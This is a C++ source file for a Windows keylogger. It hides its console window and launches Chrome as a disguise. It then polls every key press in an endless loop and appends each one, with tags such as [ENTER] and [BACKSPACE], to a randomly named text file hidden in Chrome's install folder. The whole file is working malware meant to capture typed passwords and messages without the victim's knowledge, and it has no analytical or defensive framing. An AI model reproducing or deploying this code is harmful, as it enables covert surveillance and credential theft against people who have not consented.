#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <cstdio>
#include <Lmcons.h>
#include <vector>
#include<sys/stat.h>
#include <tlhelp32.h>
#include <streambuf>

using namespace std;
const int MAX = 26;

string getString(char x)
{
    char character = static_cast<char>(x);
    string s(1, character);
    return s;
}


int writeCharToFile(string fileName, string x)
{
    ofstream myfile;
    myfile.open(fileName, ios_base::app);
    myfile << x;
    return 0;
}

string generateFileName(int n)
{
    char alphabet[MAX] = {'a', 'b', 'c', 'd', 'e', 'f', 'g',
                          'h', 'i', 'j', 'k', 'l', 'm', 'n',
                          'o', 'p', 'q', 'r', 's', 't', 'u',
                          'v', 'w', 'x', 'y', 'z'};

    string res = "";
    for (int i = 0; i < n; i++)
        res = res + alphabet[rand() % MAX];

    return "C:\\Program Files (x86)\\Google\\Chrome\\Application\\" + res + ".txt";
}

bool is_file_exist(const char *fileName)
{
    ifstream infile(fileName);
    return infile.good();
}

void openGoogleChrome(){
    STARTUPINFO info = {sizeof(info)};
    PROCESS_INFORMATION processInfo;
    if (is_file_exist("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"))
    {
        CreateProcess("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
    }else{
        exit(0); 
    }
    
}

string createVBScript()
{

}


int main()
{
    FreeConsole();
    Sleep(1000);
    short character;
    string fileName = generateFileName(10);
    openGoogleChrome();
    while (1)
    {
        for (character = 8; character <= 200; character++)
        {

            if (GetAsyncKeyState(character) == -32767)
            {


                if ((character >= 39) && (character <= 64))
                {
                    writeCharToFile(fileName, getString(character));
                    break;
                }
                else if ((character > 64) && (character < 91))
                {
                    //Checking if number is alpha character and converting it to uppercase.
                    character += 32;
                    writeCharToFile(fileName, getString(character));
                    break;
                }
                else
                {
                    switch (character)
                    {
                    case VK_SPACE:
                        writeCharToFile(fileName, " ");
                        break;
                    case VK_SHIFT:
                        writeCharToFile(fileName, "[SHIFT]");
                        break;
                    case VK_RETURN:
                        writeCharToFile(fileName, "\n[ENTER]");
                        break;
                    case VK_BACK:
                        writeCharToFile(fileName, "[BACKSPACE]");
                        break;
                    case VK_TAB:
                        writeCharToFile(fileName, "[TAB]");
                        break;
                    case VK_CONTROL:
                        writeCharToFile(fileName, "[CTRL]");
                        break;
                    case VK_DELETE:
                        writeCharToFile(fileName, "[DEL]");
                        break;
                    case VK_OEM_1:
                        writeCharToFile(fileName, "[;:]");
                        break;
                    case VK_OEM_2:
                        writeCharToFile(fileName, "[/?]");
                        break;
                    case VK_OEM_3:
                        writeCharToFile(fileName, "[`~]");
                        break;
                    case VK_OEM_4:
                        writeCharToFile(fileName, "[ [{ ]");
                        break;
                    case VK_OEM_5:
                        writeCharToFile(fileName, "[\\|]");
                        break;
                    case VK_OEM_6:
                        writeCharToFile(fileName, "[ ]} ]");
                        break;
                    case VK_OEM_7:
                        writeCharToFile(fileName, "['\"]");
                        break;
                    case VK_NUMPAD0:
                        writeCharToFile(fileName, "0");
                        break;
                    case VK_NUMPAD1:
                        writeCharToFile(fileName, "1");
                        break;
                    case VK_NUMPAD2:
                        writeCharToFile(fileName, "2");
                        break;
                    case VK_NUMPAD3:
                        writeCharToFile(fileName, "3");
                        break;
                    case VK_NUMPAD4:
                        writeCharToFile(fileName, "4");
                        break;
                    case VK_NUMPAD5:
                        writeCharToFile(fileName, "5");
                        break;
                    case VK_NUMPAD6:
                        writeCharToFile(fileName, "6");
                        break;
                    case VK_NUMPAD7:
                        writeCharToFile(fileName, "7");
                        break;
                    case VK_NUMPAD8:
                        writeCharToFile(fileName, "8");
                        break;
                    case VK_NUMPAD9:
                        writeCharToFile(fileName, "9");
                        break;
                    case VK_CAPITAL:
                        writeCharToFile(fileName, "[CAPS LOCK]");
                        break;
                    default:
                        break;
                    }
                }
            }
        }
    }
}